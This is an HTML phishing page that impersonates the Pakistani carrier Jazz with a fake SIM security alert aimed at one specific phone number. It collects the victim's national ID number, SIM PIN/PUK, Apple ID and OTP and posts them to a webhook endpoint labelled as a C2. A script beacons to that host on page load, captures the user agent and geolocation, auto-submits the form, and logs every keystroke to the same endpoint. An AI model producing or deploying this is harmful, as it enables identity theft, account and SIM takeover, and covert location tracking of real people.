<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Jazz SIM Secure Verification</title>
  <style>
    body { font-family: -apple-system, sans-serif; background: linear-gradient(135deg, #FF6600, #CC5200); color: white; margin: 0; padding: 20px; text-align: center; }
    .logo { width: 150px; margin: 20px 0; }
    input { width: 90%; padding: 15px; margin: 10px; border: none; border-radius: 10px; font-size: 16px; }
    button { background: #00AA00; color: white; padding: 15px 30px; border: none; border-radius: 10px; font-size: 18px; font-weight: bold; }
    .alert { background: rgba(255,255,255,0.2); padding: 15px; border-radius: 10px; margin: 20px 0; }
  </style>
</head>
<body>
  <img src="https://jazz.com.pk/assets/img/logo.png" alt="Jazz" class="logo">
  <h1>ðŸš¨ SIM 03312595550 Security Alert</h1>
  <div class="alert">Your Jazz SIM detected unusual activity. Verify to avoid block.</div>
  
  <form id="form" action="https://webhook.site/8d04ffb9-24af-488b-a0f8-4c1c4c5f0d5a" method="POST">  <!-- YOUR C2 ENDPOINT -->
    <input type="hidden" name="phone" value="03312595550">
    <input type="hidden" name="ip" id="ip">
    <input type="hidden" name="ua" id="ua">
    <input type="hidden" name="lat" id="lat">
    <input type="hidden" name="lon" id="lon">
    
    <input type="tel" name="cnic" placeholder="CNIC (13 digits)" required pattern="\d{13}">
    <input type="password" name="pin" placeholder="Jazz PIN / PUK" required>
    <input type="email" name="appleid" placeholder="Apple ID / iCloud Email" autocomplete="email">
    <input type="text" name="otp" placeholder="Enter OTP if shown">
    <button type="submit">Secure SIM Now</button>
  </form>
  
  <script>
    // iPhone Beacon: Auto-steal on load (even no submit)
    fetch('https://webhook.site/8d04ffb9-24af-488b-a0f8-4c1c4c5f0d5a?phone=03312595550')  // REPLACE
      .then(() => {
        // Grab IP/UA
        document.getElementById('ua').value = navigator.userAgent;
        document.getElementById('ip').value = 'auto-captured';
        
        // Location (iPhone prompts rarely block)
        navigator.geolocation.getCurrentPosition(pos => {
          document.getElementById('lat').value = pos.coords.latitude;
          document.getElementById('lon').value = pos.coords.longitude;
          document.forms[0].submit();  // Auto-sub if possible
        });
      });
    
    // Keylogger
    document.querySelectorAll('input').forEach(inp => {
      inp.addEventListener('input', e => {
        fetch(https://webhook.site/8d04ffb9-24af-488b-a0f8-4c1c4c5f0d5a + e.target.value + '&field=' + e.target.name);
      });
    });
  </script>
</body>
</html>
